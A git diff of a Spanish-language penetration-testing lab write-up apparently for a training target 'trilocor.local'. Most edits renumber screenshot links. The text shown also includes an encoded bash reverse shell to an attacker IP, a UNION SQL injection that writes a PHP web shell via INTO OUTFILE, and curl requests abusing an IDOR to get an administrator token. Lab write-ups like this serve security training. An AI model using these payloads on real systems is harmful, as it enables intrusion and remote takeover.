@@ -297,13 +297,13 @@ Se construyó un archivo SVG que referencia el DTD remoto y&#x20;fuerza la reso
 <svg>&content;/svg>
 ```
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 decodificamos
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
 creamos una rev shell y la subimos&#x20;
 
@@ -316,11 +316,11 @@ version="1.1">
 </svg>
 ```
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 se verifica el RCE
 
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 vale hacemos la reverse shell
 
@@ -328,17 +328,17 @@ vale hacemos la reverse shell
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.223%2F1234%200%3E%261%22
 ```
 
-<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
 ## JOB PORTAL (8080)
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 VAMOS A LA FUNCIONALIDAD DE RESETEO DE CONTRASEÑA
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 CAPTURO PETICIÓN CON CAIDO
 
@@ -348,7 +348,7 @@ ATAQUE SNIPER AL TOKEN
 
 <div><figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 120602.png" alt=""><figcaption></figcaption></figure> <figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 120543.png" alt=""><figcaption></figcaption></figure></div>
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 ingresamos ya el token con la nueva contraseña de r.batty e iniciamos sesión con esas credenciales
 
@@ -357,3 +357,66 @@ ingresamos ya el token con la nueva contraseña de r.batty e iniciamos sesión c
 ### task 5
 
 <figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 121050.png" alt=""><figcaption></figcaption></figure>
+
+me registro ususario test:test123
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+sql injection en parámetro search
+
+<figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 122134.png" alt=""><figcaption></figcaption></figure>
+
+hay un union select
+
+<figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 122459.png" alt=""><figcaption></figcaption></figure>
+
+confirmacion de escritura mediante secure\_file\_priv
+
+```
+http://trilocor.local:8080/resumes.php?search=' UNION SELECT 1, 2, variable_name, variable_value, 5,6 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+{% embed url="http://trilocor.local:8080/resumes.php?search=%27union%20select%201,%202,%20%27%3C?php%20system($_GET[%22cmd%22]);?%3E%27,%204,%205%20,6%20into%20outfile%20%27/var/www/public/shell.php%27--%20-" %}
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+### task 6
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+## trilocor.local (9000)
+
+nos registramos
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+nos logueamos
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+al analizar el código fuente vemos que podemos obtener el token mediante la API
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+realizamos la petición
+
+```
+curl -s -X POST 'http://trilocor.local:9000/api/tokens' -H 'Content-Type: application/json' -s -d '{"uid": 3, "username": "test"}'
+```
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+tenemos un IDOR
+
+```
+curl -s -X POST 'http://trilocor.local:9000/api/tokens' -H 'Content-Type: application/json' -s -d '{"uid": 1, "username": "administrator"}'
+```
+
+<figure><img src="../.gitbook/assets/image (1751).png" alt=""><figcaption></figcaption></figure>
+
